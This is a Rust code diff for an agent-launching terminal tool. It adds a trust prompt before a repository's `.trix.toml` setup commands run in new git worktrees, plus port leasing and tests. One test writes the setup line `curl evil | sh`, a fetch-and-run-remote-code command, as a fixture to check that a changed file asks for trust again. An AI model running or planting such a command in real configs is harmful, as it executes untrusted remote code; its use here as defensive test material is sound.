@@ -173,6 +173,17 @@ pub struct NewForm {
     pub worktree: bool,
     pub args: TextInput,
     pub error: Option<String>,
+    /// You answered the trust dialog with "not this time".
+    pub skip_setup: bool,
+}
+
+/// A repository's `.trix.toml` wants to run things: yours to read first.
+pub struct TrustAsk {
+    /// The form that asked, to go back to.
+    pub form: NewForm,
+    pub repo: crate::worktree::RepoConfig,
+    /// The active button. Starts off "trust", so enter alone can't.
+    pub sel: usize,
 }
 
 pub const NEW_FIELDS: [&str; 6] = ["Agent", "Folder", "Name", "Prompt", "Worktree", "Args"];
@@ -298,6 +309,8 @@ pub enum Modal {
     Settings(Settings),
     /// alt+v: an agent's diff, its notes, and the git steps after it.
     Review(Box<crate::review::Review>),
+    /// A new worktree's repository has a `.trix.toml` you haven't trusted.
+    TrustSetup(Box<TrustAsk>),
 }
 
 /// One agent's menu: right-click it, or the menu key for the focused one.
@@ -437,6 +450,7 @@ pub enum DialogHit {
 /// that presses it. The first is the one Enter presses when the dialog opens.
 pub const CONFIRM_BUTTONS: [(&str, &str); 2] = [("y", "yes"), ("esc", "keep")];
 pub const RESTORE_BUTTONS: [(&str, &str); 3] = [("y", "restore"), ("n", "start fresh"), ("esc", "later")];
+pub const TRUST_BUTTONS: [(&str, &str); 3] = [("y", "trust and run"), ("n", "not this time"), ("esc", "back")];
 
 struct Drag {
     agent: u32,
@@ -852,6 +866,7 @@ impl App {
                 prompt: None,
                 branch_note: Some(if resume.is_some() { "resuming conversation" } else { "restored" }.into()),
                 resume,
+                runtime: Default::default(),
             };
             let res = if kind == Kind::Custom {
                 let cmd = spec.command.clone().unwrap_or_default();
@@ -1421,6 +1436,7 @@ impl App {
             worktree: new.worktree,
             args: TextInput::default(),
             error: None,
+            skip_setup: false,
         };
         f.name = TextInput::new(&self.suggest_name(&dir));
         self.modal = Some(Modal::New(f));
@@ -1457,7 +1473,13 @@ impl App {
         Ok(id)
     }
 
-    fn start(&mut self, run: Spawn, keep: Spawn) -> anyhow::Result<u32> {
+    fn start(&mut self, mut run: Spawn, mut keep: Spawn) -> anyhow::Result<u32> {
+        // Every way in (a form, `trix spawn`, a layout, a restore) gets the
+        // worktree's ports, and the same ones it had.
+        if run.runtime.ports.is_none() {
+            run.runtime.ports = crate::worktree::lease(&run.cwd, &self.config.worktree, None);
+        }
+        keep.runtime = run.runtime.clone();
         let id = self.next_id;
         self.next_id += 1;
         let agent = Agent::spawn_in(id, run, self.pane_size, self.tx.clone(), &self.socket, &self.integrations, &self.exe, self.holders)?;
@@ -1519,7 +1541,7 @@ impl App {
             let base = if meta.name.is_empty() { kind.label() } else { meta.name.as_str() };
             let name = self.unique_name(base);
             let agent = Agent::reattach(id, kind, name, &meta, att, self.tx.clone());
-            let spec = Spawn { kind, name: agent.name.clone(), cwd: meta.cwd.clone(), command: meta.command.clone(), prompt: None, branch_note: None, resume: None };
+            let spec = Spawn { kind, name: agent.name.clone(), cwd: meta.cwd.clone(), command: meta.command.clone(), prompt: None, branch_note: None, resume: None, runtime: Default::default() };
             if meta.parked && agent.state == State::Exited {
                 self.parked.insert(id);
             }
@@ -1607,7 +1629,27 @@ impl App {
             unique_in(&self.agents, &base)
         };
         let mut note = None;
+        let mut runtime = crate::worktree::Runtime::default();
+        let mut warning = None;
         if f.worktree {
+            let repo = match crate::worktree::RepoConfig::load(&cwd) {
+                Ok(r) => r,
+                Err(e) => {
+                    f.error = Some(e);
+                    return;
+                }
+            };
+            // Only a worktree about to be made uses the file.
+            let asks = repo.as_ref().is_some_and(|r| !f.skip_setup && !worktree_path(&r.root, &slug(&name)).exists() && !r.trusted());
+            if asks {
+                let (Some(Modal::New(form)), Some(repo)) = (self.modal.take(), repo) else { return };
+                self.modal = Some(Modal::TrustSetup(Box::new(TrustAsk { form, repo, sel: 1 })));
+                // Hidden until a frame has shown it: a `y` typed ahead, in the
+                // same burst of input as the Enter, can't trust unread commands.
+                self.dialog_hidden.set(true);
+                self.dirty = true;
+                return;
+            }
             match make_worktree(&cwd, &slug(&name)) {
                 Ok((path, branch, reused)) => {
                     if let Some(other) = self.agents.iter().find(|a| a.cwd == path) {
@@ -1615,8 +1657,12 @@ impl App {
                         f.field = 2;
                         return;
                     }
+                    let ready = crate::worktree::prepare(&path, repo.as_ref(), reused, f.skip_setup, &self.config.worktree);
                     cwd = path;
-                    note = Some(format!("{} worktree on {branch}", if reused { "reusing" } else { "new" }));
+                    let made = format!("{} worktree on {branch}", if reused { "reusing" } else { "new" });
+                    note = Some(ready.note.map_or(made.clone(), |n| format!("{made} · {n}")));
+                    runtime = ready.runtime;
+                    warning = ready.warning;
                 }
                 Err(e) => {
                     f.error = Some(e.to_string());
@@ -1632,11 +1678,15 @@ impl App {
             prompt: Some(f.prompt.text.clone()).filter(|s| !s.trim().is_empty()),
             branch_note: note,
             resume: None,
+            runtime,
         };
         self.modal = None;
         match self.spawn(spec) {
             Ok(_) => self.remember_launch(kind, &chosen),
             Err(e) => self.toast(format!("could not start: {e}"), ToastKind::Bad),
+        }
+        if let Some(w) = warning {
+            self.toast(w, ToastKind::Bad);
         }
     }
 
@@ -1659,8 +1709,17 @@ impl App {
     fn restart(&mut self, idx: usize) {
         let old_id = self.agents[idx].id;
         let Some(mut spec) = self.specs.remove(&old_id) else { return };
-        spec.prompt = None;
+        // A setup that failed never got to the agent: Enter tries it again,
+        // and the first prompt is still to come.
+        if !(spec.runtime.setup.is_some() && self.agents[idx].installing.is_some()) {
+            spec.prompt = None;
+            spec.runtime.setup = None;
+        }
         spec.resume = None;
+        // Reattached after a crash, it has no record of them.
+        if spec.runtime.ports.is_none() {
+            spec.runtime.ports = crate::worktree::lease(&spec.cwd, &self.config.worktree, None);
+        }
         self.parked.remove(&old_id);
         // A fresh id, so late hook / exit events from the old process can't
         // land on the new one.
@@ -1691,6 +1750,13 @@ impl App {
             let a = self.agents.remove(i);
             a.shutdown();
             crate::usage::merge(&mut self.closed_spend, &a.spend);
+            // The worktree's ports go back with the last agent in it.
+            let folder = |s: &Self, o: &Agent| s.specs.get(&o.id).map_or(o.cwd.clone(), |x| x.cwd.clone());
+            if let Some(tree) = crate::worktree::managed_root(&folder(self, &a))
+                && !self.agents.iter().any(|o| crate::worktree::managed_root(&folder(self, o)).as_ref() == Some(&tree))
+            {
+                crate::worktree::release(&tree);
+            }
             // A menu or dialog about it has nothing left to act on.
             if matches!(self.modal, Some(Modal::Menu(Menu { agent, .. }) | Modal::Rename(agent, _) | Modal::ConfirmClose(agent, _)) if agent == id)
                 || matches!(&self.modal, Some(Modal::Review(r)) if r.agent == id)
@@ -2604,6 +2670,10 @@ impl App {
                 *sel = i;
                 self.modal_key(press(KeyCode::Enter));
             }
+            (DialogHit::Button(i), Some(Modal::TrustSetup(ask))) => {
+                ask.sel = i;
+                self.modal_key(press(KeyCode::Enter));
+            }
             (DialogHit::Target(to), Some(Modal::Broadcast(_, target))) => *target = to,
             (DialogHit::Result(i), Some(Modal::Search(s))) => {
                 s.sel = i;
@@ -2673,10 +2743,48 @@ impl App {
             {
                 return;
             }
-            self.modal = None;
+            // The trust dialog goes back to the form, with what's typed in it.
+            self.modal = match self.modal.take() {
+                Some(Modal::TrustSetup(ask)) => Some(Modal::New(ask.form)),
+                _ => None,
+            };
             return;
         }
         match modal {
+            // Keys it doesn't show do nothing: no trusting what you can't read.
+            Modal::TrustSetup(_) if self.dialog_hidden.get() => {}
+            Modal::TrustSetup(ask) => {
+                let press = match k.code {
+                    KeyCode::Char('y') => Some(0),
+                    KeyCode::Char('n') => Some(1),
+                    KeyCode::Enter => Some(ask.sel),
+                    _ => {
+                        if let Some(to) = move_button(ask.sel, TRUST_BUTTONS.len(), k.code) {
+                            ask.sel = to;
+                        }
+                        None
+                    }
+                };
+                let Some(press) = press else { return };
+                let Some(Modal::TrustSetup(ask)) = self.modal.take() else { return };
+                let TrustAsk { mut form, repo, .. } = *ask;
+                match press {
+                    0 => {
+                        if let Err(e) = repo.trust() {
+                            form.error = Some(format!("couldn't save that you trust it: {e}"));
+                            self.modal = Some(Modal::New(form));
+                            return;
+                        }
+                    }
+                    1 => form.skip_setup = true,
+                    _ => {
+                        self.modal = Some(Modal::New(form));
+                        return;
+                    }
+                }
+                self.modal = Some(Modal::New(form));
+                self.launch_form();
+            }
             // Handled above.
             Modal::Menu(_) | Modal::Settings(_) | Modal::Review(_) => {}
             Modal::Help => self.modal = None,
@@ -3469,6 +3577,7 @@ fn clone_spec(s: &Spawn) -> Spawn {
         prompt: s.prompt.clone(),
         branch_note: s.branch_note.clone(),
         resume: s.resume.clone(),
+        runtime: s.runtime.clone(),
     }
 }
 
@@ -3543,28 +3652,41 @@ fn worktree_name(slug: &str) -> String {
     if out.is_empty() { "agent".into() } else { out }
 }
 
-/// Create `<repo>/.trix/worktrees/<name>` on branch `trix/<name>`. The flag
-/// is true when an existing worktree (e.g. from an earlier session) was reused.
-pub fn make_worktree(dir: &Path, name: &str) -> anyhow::Result<(PathBuf, String, bool)> {
-    let name = &worktree_name(name);
-    let top = git(dir, &["rev-parse", "--show-toplevel"]).ok_or_else(|| anyhow::anyhow!("not a git repository"))?;
-    let top = PathBuf::from(top);
+/// The main checkout of the repository `dir` is in, and its git folder.
+/// Anchored there even from inside a worktree (the form defaults to the
+/// focused agent's folder), so worktrees never nest inside each other.
+fn checkout_of(dir: &Path) -> Option<(PathBuf, PathBuf)> {
+    let top = PathBuf::from(git(dir, &["rev-parse", "--show-toplevel"])?);
     let common = git(&top, &["rev-parse", "--git-common-dir"]).unwrap_or_else(|| ".git".into());
     let common = if Path::new(&common).is_absolute() { PathBuf::from(common) } else { top.join(common) };
-    // Anchor at the main checkout even when launched from inside a worktree
-    // (the form defaults to the focused agent's folder), so worktrees never
-    // nest inside each other.
     let root = match common.file_name() {
         Some(n) if n == ".git" => common.parent().map(Path::to_path_buf).unwrap_or(top),
         _ => top,
     };
+    Some((root, common))
+}
+
+pub fn main_checkout(dir: &Path) -> Option<PathBuf> {
+    checkout_of(dir).map(|(root, _)| root)
+}
+
+/// Where the worktree called `name` lives in the checkout at `root`.
+fn worktree_path(root: &Path, name: &str) -> PathBuf {
+    root.join(".trix/worktrees").join(worktree_name(name))
+}
+
+/// Create `<repo>/.trix/worktrees/<name>` on branch `trix/<name>`. The flag
+/// is true when an existing worktree (e.g. from an earlier session) was reused.
+pub fn make_worktree(dir: &Path, name: &str) -> anyhow::Result<(PathBuf, String, bool)> {
+    let (root, common) = checkout_of(dir).ok_or_else(|| anyhow::anyhow!("not a git repository"))?;
     let exclude = common.join("info/exclude");
     let existing = std::fs::read_to_string(&exclude).unwrap_or_default();
     if !existing.lines().any(|l| l.trim() == ".trix/") {
         let _ = std::fs::create_dir_all(common.join("info"));
         let _ = std::fs::write(&exclude, format!("{existing}{}.trix/\n", if existing.is_empty() || existing.ends_with('\n') { "" } else { "\n" }));
     }
-    let path = root.join(".trix/worktrees").join(name);
+    let path = worktree_path(&root, name);
+    let name = &worktree_name(name);
     let branch = format!("trix/{name}");
     if path.exists() {
         return Ok((path, branch, true));
@@ -4468,6 +4590,7 @@ mod tests {
             prompt: None,
             branch_note: None,
             resume: None,
+            runtime: Default::default(),
         };
         let a = app.spawn_quiet(spec("x")).unwrap();
         let b = app.spawn_quiet(spec("y")).unwrap();
@@ -4562,7 +4685,7 @@ mod tests {
         // With echo on, how the terminal's echoes interleave with cat's
         // output is up to the scheduler, and CI runners differ. `ready` says
         // echo is off: a login shell can take a while to get there.
-        let spec = Spawn { kind: Kind::Custom, name: "cat".into(), cwd: std::env::temp_dir(), command: Some("stty -echo; echo ready; exec cat".into()), prompt: None, branch_note: None, resume: None };
+        let spec = Spawn { kind: Kind::Custom, name: "cat".into(), cwd: std::env::temp_dir(), command: Some("stty -echo; echo ready; exec cat".into()), prompt: None, branch_note: None, resume: None, runtime: Default::default() };
         let id = app.spawn_quiet(spec).unwrap();
         let i = app.index_of(id).unwrap();
         // What's on screen after `ready`, once it shows.
@@ -4596,7 +4719,7 @@ mod tests {
         let script = std::env::temp_dir().join(format!("trix-test-wheel-{}.sh", std::process::id()));
         std::fs::write(&script, "printf '\\033[?1049h\\033[?1000h\\033[?1006h'\nstty raw -echo\nprintf 'ready\\r\\n'\nhead -c 10 | od -An -c\nsleep 5\n").unwrap();
         let command = format!("exec /bin/sh {}", script.display());
-        let spec = Spawn { kind: Kind::Custom, name: "mouse".into(), cwd: std::env::temp_dir(), command: Some(command), prompt: None, branch_note: None, resume: None };
+        let spec = Spawn { kind: Kind::Custom, name: "mouse".into(), cwd: std::env::temp_dir(), command: Some(command), prompt: None, branch_note: None, resume: None, runtime: Default::default() };
         let id = app.spawn_quiet(spec).unwrap();
         let i = app.index_of(id).unwrap();
         let screen = |app: &App| crate::search::tail(&app.agents[i].term.lock(), 10).concat().split_whitespace().collect::<String>();
@@ -4707,7 +4830,7 @@ mod tests {
         let mut app = test_app();
         let mut a = crate::agent::test_agent(Kind::Claude);
         a.id = 5;
-        app.specs.insert(5, Spawn { kind: Kind::Claude, name: "c".into(), cwd: std::env::temp_dir(), command: Some("--model opus 5.5".into()), prompt: None, branch_note: None, resume: None });
+        app.specs.insert(5, Spawn { kind: Kind::Claude, name: "c".into(), cwd: std::env::temp_dir(), command: Some("--model opus 5.5".into()), prompt: None, branch_note: None, resume: None, runtime: Default::default() });
         app.agents.push(a);
         *app.extra_args_mut(5).unwrap() = Some("--model claude-opus-5-5 --effort xhigh".into());
         assert_eq!(app.open_agents()[0].command.as_deref(), Some("--model claude-opus-5-5 --effort xhigh"));
@@ -4725,7 +4848,7 @@ mod tests {
         // Restored with --resume: the conversation exists before any new turn.
         a.session = Some("0b5e2c1a-7f3d-4c2e-9a1b-2d3e4f5a6b7c".into());
         assert!(!a.session_named_by_trix && !a.turn_seen);
-        app.specs.insert(3, Spawn { kind: Kind::Grok, name: "g".into(), cwd: std::env::temp_dir(), command: None, prompt: None, branch_note: None, resume: None });
+        app.specs.insert(3, Spawn { kind: Kind::Grok, name: "g".into(), cwd: std::env::temp_dir(), command: None, prompt: None, branch_note: None, resume: None, runtime: Default::default() });
         app.agents.push(a);
         assert_eq!(app.open_agents()[0].session.as_deref(), Some("0b5e2c1a-7f3d-4c2e-9a1b-2d3e4f5a6b7c"), "restored, then saved again before you type");
         // An id trix made up for a new conversation: nothing to resume until a turn.
@@ -4746,7 +4869,7 @@ mod tests {
         // SessionStart names the conversation and its log, before any message.
         a.session = Some("1edd8d96-d5b4-47b7-98a2-3b9a0daa56b2".into());
         a.transcript = Some(log.clone());
-        app.specs.insert(4, Spawn { kind: Kind::Claude, name: "c".into(), cwd: std::env::temp_dir(), command: None, prompt: None, branch_note: None, resume: None });
+        app.specs.insert(4, Spawn { kind: Kind::Claude, name: "c".into(), cwd: std::env::temp_dir(), command: None, prompt: None, branch_note: None, resume: None, runtime: Default::default() });
         app.agents.push(a);
         assert_eq!(app.open_agents()[0].session, None, "no message yet: --resume would find nothing");
         std::fs::write(&log, "{}\n").unwrap();
@@ -4758,6 +4881,169 @@ mod tests {
         app.agents[0].shutdown();
     }
 
+    /// A repository whose `.trix.toml` sets up and copies, and hasn't been
+    /// trusted: each test's path is its own.
+    fn repo_with_setup(tag: &str) -> PathBuf {
+        let dir = std::env::temp_dir().join(format!("trix-app-repo-{tag}-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&dir);
+        std::fs::create_dir_all(&dir).unwrap();
+        let dir = dir.canonicalize().unwrap();
+        let git = |args: &[&str]| {
+            let out = Command::new("git").arg("-C").arg(&dir).args(["-c", "user.name=t", "-c", "user.email=t@example.com", "-c", "commit.gpgsign=false"]).args(args).output().unwrap();
+            assert!(out.status.success(), "git {args:?}: {}", String::from_utf8_lossy(&out.stderr));
+        };
+        git(&["init", "-q", "-b", "main"]);
+        std::fs::write(dir.join(".gitignore"), ".env\n").unwrap();
+        git(&["add", "."]);
+        git(&["commit", "-q", "-m", "init"]);
+        std::fs::write(dir.join(".env"), "A=1\n").unwrap();
+        std::fs::write(dir.join(".trix.toml"), "[worktree]\nsetup = 'true'\ncopy = ['.env']\nports = 5\n").unwrap();
+        dir
+    }
+
+    fn worktree_form(dir: &Path, name: &str) -> Modal {
+        Modal::New(NewForm { kind: Kind::Custom, main: Vec::new(), more: false, field: 0, top: Default::default(), name: TextInput::new(name), name_touched: true, dir: TextInput::new(&dir.display().to_string()), folders: Folders::new(dir.to_path_buf(), Vec::new(), ""), prompt: TextInput::default(), worktree: true, args: TextInput::new("exec sleep 60"), error: None, skip_setup: false })
+    }
+
+    fn asked(app: &mut App, dir: &Path, name: &str) {
+        app.modal = Some(worktree_form(dir, name));
+        app.launch_form();
+        assert!(matches!(app.modal, Some(Modal::TrustSetup(_))), "the form asks first");
+        assert!(!worktree_path(dir, name).exists(), "and makes nothing yet");
+        // As a frame showing all of it would.
+        app.dialog_hidden.set(false);
+    }
+
+    fn trust_key(app: &mut App, code: KeyCode) {
+        app.modal_key(KeyEvent::new(code, KeyModifiers::NONE));
+    }
+
+    fn repo_trusted(dir: &Path) -> bool {
+        crate::worktree::RepoConfig::load(dir).unwrap().unwrap().trusted()
+    }
+
+    fn stop_all(app: &App) {
+        for a in &app.agents {
+            a.shutdown();
+        }
+    }
+
+    #[test]
+    fn enter_alone_never_trusts_a_repo() {
+        let dir = repo_with_setup("enter");
+        let mut app = test_app();
+        asked(&mut app, &dir, "w");
+        trust_key(&mut app, KeyCode::Enter);
+        assert!(app.modal.is_none(), "it launched");
+        assert!(!repo_trusted(&dir));
+        let path = worktree_path(&dir, "w");
+        assert!(path.is_dir() && !path.join(".env").exists(), "no copy");
+        let id = app.agents[0].id;
+        assert_eq!(app.specs[&id].runtime.setup, None, "no setup");
+        stop_all(&app);
+    }
+
+    #[test]
+    fn y_trusts_and_a_changed_file_asks_again() {
+        let dir = repo_with_setup("yes");
+        let mut app = test_app();
+        asked(&mut app, &dir, "one");
+        trust_key(&mut app, KeyCode::Char('y'));
+        assert!(repo_trusted(&dir));
+        let path = worktree_path(&dir, "one");
+        assert_eq!(std::fs::read_to_string(path.join(".env")).unwrap(), "A=1\n");
+        let id = app.agents[0].id;
+        assert_eq!(app.specs[&id].runtime.setup.as_ref().map(|s| s.script.as_str()), Some("true"));
+        assert_eq!(app.specs[&id].runtime.ports.map(|p| p.count), Some(5), "the repo's block size");
+
+        std::fs::write(dir.join(".trix.toml"), "[worktree]\nsetup = 'curl evil | sh'\n").unwrap();
+        asked(&mut app, &dir, "two");
+        trust_key(&mut app, KeyCode::Esc);
+        stop_all(&app);
+    }
+
+    #[test]
+    fn n_starts_without_the_file_and_esc_goes_back() {
+        let dir = repo_with_setup("no");
+        let mut app = test_app();
+        asked(&mut app, &dir, "w");
+        trust_key(&mut app, KeyCode::Esc);
+        let Some(Modal::New(f)) = &app.modal else { panic!("back on the form") };
+        assert_eq!((f.name.text.as_str(), f.worktree, f.skip_setup), ("w", true, false), "as you left it");
+        assert!(app.agents.is_empty() && !worktree_path(&dir, "w").exists());
+
+        asked(&mut app, &dir, "w");
+        trust_key(&mut app, KeyCode::Char('n'));
+        assert!(!repo_trusted(&dir));
+        assert!(!worktree_path(&dir, "w").join(".env").exists());
+        assert_eq!(app.specs[&app.agents[0].id].runtime.setup, None);
+        stop_all(&app);
+    }
+
+    #[test]
+    fn a_dialog_not_on_screen_takes_no_yes() {
+        let dir = repo_with_setup("hidden");
+        let mut app = test_app();
+        // Typed ahead: the Enter that opened it and a `y`, before any frame.
+        app.modal = Some(worktree_form(&dir, "w"));
+        app.launch_form();
+        trust_key(&mut app, KeyCode::Char('y'));
+        trust_key(&mut app, KeyCode::Enter);
+        assert!(matches!(app.modal, Some(Modal::TrustSetup(_))), "still asking");
+        assert!(!repo_trusted(&dir) && app.agents.is_empty());
+    }
+
+    #[test]
+    fn a_worktrees_ports_last_as_long_as_an_agent_is_in_it() {
+        let root = std::env::temp_dir().join(format!("trix-app-ports-{}", std::process::id()));
+        let tree = root.join(".trix/worktrees/w");
+        std::fs::create_dir_all(&tree).unwrap();
+        let tree = tree.canonicalize().unwrap();
+        let spec = |name: &str| Spawn { kind: Kind::Custom, name: name.into(), cwd: tree.clone(), command: Some("exec sleep 60".into()), prompt: None, branch_note: None, resume: None, runtime: Default::default() };
+        let mut app = test_app();
+        // How a layout or a restore starts one: ports, and no setup.
+        let a = app.spawn_quiet(spec("a")).unwrap();
+        let ports = app.specs[&a].runtime.ports.expect("a block");
+        assert_eq!(app.specs[&a].runtime.setup, None);
+        let b = app.spawn_quiet(spec("b")).unwrap();
+        assert_eq!(app.specs[&b].runtime.ports, Some(ports), "a shared worktree shares them");
+
+        // Reattached after a crash, its spec has no record of them.
+        app.specs.get_mut(&a).unwrap().runtime = Default::default();
+        let i = app.index_of(a).unwrap();
+        app.restart(i);
+        let a = app.agents[i].id;
+        assert_eq!(app.specs[&a].runtime.ports, Some(ports), "the same block");
+
+        app.close(a);
+        assert_eq!(crate::worktree::leased(&tree), Some(ports), "b is still in it");
+        app.close_many(&[b]);
+        assert_eq!(crate::worktree::leased(&tree), None);
+    }
+
+    #[test]
+    fn enter_on_a_failed_setup_runs_it_again_with_the_prompt() {
+        let mut app = test_app();
+        let setup = crate::worktree::Setup { script: "false".into(), root: std::env::temp_dir() };
+        let spec = Spawn { kind: Kind::Custom, name: "s".into(), cwd: std::env::temp_dir(), command: Some("exec sleep 60".into()), prompt: Some("first".into()), branch_note: None, resume: None, runtime: crate::worktree::Runtime { ports: None, setup: Some(setup.clone()) } };
+        let id = app.spawn_quiet(spec).unwrap();
+        assert!(app.agents[0].installing.is_some(), "held in starting");
+        app.agents[0].set_state(State::Exited, false);
+        app.restart(0);
+        let id2 = app.agents[0].id;
+        assert_ne!(id, id2);
+        assert_eq!(app.specs[&id2].runtime.setup, Some(setup));
+        assert_eq!(app.specs[&id2].prompt.as_deref(), Some("first"));
+
+        // Once it has worked, a restart is only a restart.
+        app.agents[0].installing = None;
+        app.agents[0].set_state(State::Exited, false);
+        app.restart(0);
+        let id3 = app.agents[0].id;
+        assert_eq!((app.specs[&id3].runtime.setup.as_ref(), app.specs[&id3].prompt.as_ref()), (None, None));
+        stop_all(&app);
+    }
+
     #[test]
     fn names_from_the_form_and_rename_stay_unique() {
         let mut app = test_app();
@@ -4767,7 +5053,7 @@ mod tests {
         app.agents.push(a);
         let tmp = std::env::temp_dir();
         let form = |name: &str, touched: bool| {
-            let mut f = NewForm { kind: Kind::Custom, main: Vec::new(), more: false, field: 0, top: Default::default(), name: TextInput::new(name), name_touched: touched, dir: TextInput::new(&tmp.display().to_string()), folders: Folders::new(tmp.clone(), Vec::new(), ""), prompt: TextInput::default(), worktree: false, args: TextInput::new("exec sleep 60"), error: None };
+            let mut f = NewForm { kind: Kind::Custom, main: Vec::new(), more: false, field: 0, top: Default::default(), name: TextInput::new(name), name_touched: touched, dir: TextInput::new(&tmp.display().to_string()), folders: Folders::new(tmp.clone(), Vec::new(), ""), prompt: TextInput::default(), worktree: false, args: TextInput::new("exec sleep 60"), error: None, skip_setup: false };
             f.args = TextInput::new("exec sleep 60");
             Modal::New(f)
         };
